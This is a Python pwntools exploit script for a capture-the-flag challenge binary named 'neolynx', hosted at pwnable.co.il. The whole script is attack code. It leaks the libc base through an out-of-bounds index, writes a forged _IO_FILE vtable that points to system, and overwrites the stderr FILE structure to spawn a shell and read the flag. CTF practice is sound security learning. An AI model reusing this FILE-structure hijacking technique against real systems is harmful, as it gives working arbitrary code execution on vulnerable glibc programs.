#!/usr/bin/env python3
import warnings
from pwn import *

elf = ELF("neolynx")
libc = ELF("libc-2.23.so")
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)
context.binary = elf
one_gadget = 0x3f6be
one_gadget1 = 0x3f712
one_gadget2 = 0xd6701
# one_gadget = 0x3f3e6
# one_gadget1 = 0x3f43a
# one_gadget2 = 0xd5c07

gs = '''
continue
'''

def run_program():
    if args.LOCAL:
        return process([elf.path])
    elif args.GDB:
        return gdb.debug(elf.path, gs)
    else:
        return remote("pwnable.co.il", 9012)
    

class Options:
    def __init__(self, r) :
        self.r = r

    def start(self, name):
        self.r.sendlineafter("name?\n", name)

    def add(self, index, length, name):
        self.r.recvuntil(b"Exit\n")
        self.r.send("1\n")
        self.r.recvuntil(b"Index:")
        self.r.sendline(str(index))
        self.r.recvuntil(b"Name length: ")
        self.r.sendline(str(length))
        self.r.recvuntil(b"Name: ")
        self.r.sendline(name)

    def show(self, index):
        self.r.sendafter("Exit\n", "2\n")
        self.r.sendlineafter("Index: ", str(index))

    def change(self, name):
        self.r.sendafter("Exit\n", "3\n")
        self.r.sendlineafter("Name: ", name)

class ExploitPrimitives:
    def __init__(self, r) :
        self.option = Options(r)
        self.r = r

    def leak(self):
        self.option.start("helllo")

        printf_libc_offset = libc.symbols["__printf"]
        #print(printf_libc_offset)
        printf_got_offset = -17
        printf_add = self.show_add_from_name(printf_got_offset)

        libc.address = int(printf_add) - int(printf_libc_offset)
        success(f"libc base address: {hex(libc.address)}")

    def show_add_from_name(self, index):
        self.r.sendlineafter("Exit\n", "2")
        self.r.sendlineafter("Index: ", str(index))
        self.r.recvline()
        address = self.r.recvline()
        #print(hex(int(address[12:-1])))
        return int(address[12:-1])

    def setup_jump_table(self):
        system = libc.sym["system"]
        jumps = p64(0x4141414141414141) * 2
        jumps += p64(libc.sym["_IO_new_file_finish"])
        jumps += p64(libc.sym["_IO_new_file_overflow"])
        jumps += p64(libc.sym["_IO_new_file_underflow"])
        jumps += p64(libc.sym["__GI__IO_default_uflow"])
        jumps += p64(libc.sym["__GI__IO_default_pbackfail"])
        jumps += p64(system)
        '''
        jumps += p64(libc.sym["_IO_new_file_xsputn"])
        '''
        jumps += p64(libc.sym["__GI__IO_file_xsgetn"])
        #jumps = p64(0x4141414141414141)
        jumps += p64(libc.sym["_IO_new_file_seekoff"])
        jumps += p64(libc.sym["_IO_default_seekpos"])
        jumps += p64(libc.sym["_IO_new_file_setbuf"])
        jumps += p64(libc.sym["_IO_new_file_sync"])
        jumps += p64(libc.sym["__GI__IO_file_doallocate"])
        jumps += p64(libc.sym["__GI__IO_file_read"])
        jumps += p64(libc.sym["_IO_new_file_write"])
        jumps += p64(libc.sym["__GI__IO_file_seek"])
        jumps += p64(libc.sym["__GI__IO_file_close"])
        jumps += p64(libc.sym["__GI__IO_file_stat"])
        jumps += p64(libc.sym["_IO_default_showmanyc"])
        jumps += p64(libc.sym["_IO_default_imbue"])
        self.option.add(10, 168, jumps)

    def get_table_add(self, bss_start):
        table = bss_start + 288
        self.option.change(p64(table))
        self.option.show(-2)
        self.r.recvuntil("Name: ")
        table_add = u64(((self.r.recvuntil("\n")).ljust(8, b'\x00'))) - 0xa000000000000
        self.r.recv()
        #print("VTABLE ADDRESS: " + hex(table_add))
        return table_add

    # Plan: find how to overwrite stdout entry and modify io_write_* to system stuff

    # +0040 0x5af8e8f42020  20 66 cf cf 51 7b 00 00  00 00 00 00 00 00 00 00  │.f..Q{..│........│ --> _IO_2_1_stdout_
    # +0050 0x5af8e8f42030  e0 58 cf cf 51 7b 00 00  00 00 00 00 00 00 00 00  │.X..Q{..│........│ --> _IO_2_1_stdin_
    # +0060 0x5af8e8f42040  40 65 cf cf 51 7b 00 00  00 00 00 00 00 00 00 00  │@e..Q{..│........│ --> _IO_2_1_stderr_
    # +0070 0x5af8e8f42050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
    # +0080 0x5af8e8f42060  69 64 6f 0a 00 00 00 00  00 00 00 00 00 00 00 00  │ido.....│........│ --> name variable
    # +0090 0x5af8e8f42070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │........│........│
    # +00a0 0x5af8e8f42080  10 60 54 19 f9 5a 00 00  02 00 00 00 00 00 00 00  │.`T..Z..│........│ --> idx 0 friend, 
    # first 8 bytes name_ptr, second is popularity (2)

    # So, in order to overwrite stdin entry we need to to write 5 entries back so offset will be equal to -5
    # Now, we need to craft the vtable

    def overwrite_iofile_stdin(self, table_add, binsh):

        offset = -5
        system = libc.sym["system"]
        stdin = libc.sym["_IO_2_1_stdin_"]
        print("\nlibc base: " + hex(libc.address) + "\n\nstdin entry: " + hex(stdin) + "\n\n")
        file_lock = libc.sym["_IO_stdfile_0_lock"]
        widedata = libc.sym["_IO_wide_data_0"]
        file_jumps = libc.sym["__GI__IO_file_jumps"]

        vtable = p64(binsh) 
        vtable += p64(stdin + 132) * 2 + p64(stdin + 131) * 4
        vtable += p64(stdin + 131) + p64(stdin + 132) # buf
        vtable += p64(0) * 6 + p64(0xffffffffffffffff) + p64(0x000000000a000000)
        vtable += p64(file_lock) + p64(0xffffffffffffffff) + p64(0) + p64(widedata)
        vtable += p64(0x0) * 3 + p64(0x00000000ffffffff) + p64(0) * 2 + p64(table_add)

        
        print("\n\n\nlen:")
        print(len(vtable))
        self.r.send("1\n")
        self.r.sendlineafter("Index: ", str(offset))
        self.r.sendlineafter("length: ", "224")
        self.r.sendlineafter("Name: ", vtable)
        
    def overwrite_iofile_stdout(self, table_add, binsh):
        offset = -6
        stdout = libc.sym["_IO_2_1_stdout_"]
        stdin = libc.sym["_IO_2_1_stdin_"]
        print("\nlibc base: " + hex(libc.address) + "\nstdout entry: " + hex(stdout) + "\n\n")
        file_lock = libc.sym["_IO_stdfile_1_lock"]
        widedata = libc.sym["_IO_wide_data_1"]
        file_jumps = libc.sym["__GI__IO_file_jumps"]

        vtable = p64(binsh) 
        vtable += p64(stdout + 131) * 7
        vtable += p64(stdout + 132) # buf
        vtable += p64(0) * 4 + p64(stdin) + p64(1) + p64(0xffffffffffffffff) + p64(0x000000000a000000)
        vtable += p64(file_lock) + p64(0xffffffffffffffff) + p64(0) + p64(widedata)
        vtable += p64(0x0) * 3 + p64(0x00000000ffffffff) + p64(0) * 2 + p64(table_add)

        
        print("\n\n\nLEN:")
        print(len(vtable))
        self.r.send("1\n")
        self.r.sendlineafter("Index: ", str(offset))
        self.r.sendlineafter("length: ", "224")
        self.r.sendlineafter("Name: ", vtable)

    def overwrite_iofile_stderr(self, table_add, binsh):
        offset = -4
        system = libc.sym["system"]
        stdout = libc.sym["_IO_2_1_stdout_"]
        stderr = libc.sym["_IO_2_1_stderr_"]
        print("\nlibc base: " + hex(libc.address) + "\nstdout entry: " + hex(stdout) + "\n")
        file_lock = libc.sym["_IO_stdfile_2_lock"]
        widedata = libc.sym["_IO_wide_data_2"]
        file_jumps = libc.sym["__GI__IO_file_jumps"]
        vtable = p64(binsh) 
        vtable += p64(stderr + 131) * 7
        vtable += p64(stderr + 132) # buf
        vtable += p64(0) * 4 + p64(stdout) + p64(2) + p64(0xffffffffffffffff) + p64(0x0000000000000000)
        vtable += p64(file_lock) + p64(0xffffffffffffffff) + p64(0) + p64(widedata)
        vtable += p64(0x0) * 6 + p64(table_add)

        
        #print(f"\n\n\nLEN: {len(vtable)}\n")
        self.r.send("1\n")
        self.r.sendlineafter("Index: ", str(offset))
        self.r.sendlineafter("length: ", "224")
        self.r.sendlineafter("Name: ", vtable)
        #add(offset, 224, vtable)

    def win(self):
        self.r.sendlineafter("Exit\n", "6")
        self.r.sendline("cat flag")
        print(self.r.recv())
        success(self.r.recvline())


def main():
    r = run_program()
    exploitPrimitive = ExploitPrimitives(r)
    exploitPrimitive.leak()
    bss_start = exploitPrimitive.show_add_from_name(-8) -8 # -8 cause the address points to the seccond ptr in the .bss
    exploitPrimitive.setup_jump_table()
    table = exploitPrimitive.get_table_add(bss_start)

    #binsh = next(libc.search('/bin/sh'))
    binsh = 0x68732f6e69622f

    exploitPrimitive.overwrite_iofile_stderr(table, binsh)
    exploitPrimitive.win()

    #r.interactive()

if __name__ == "__main__":
    main()
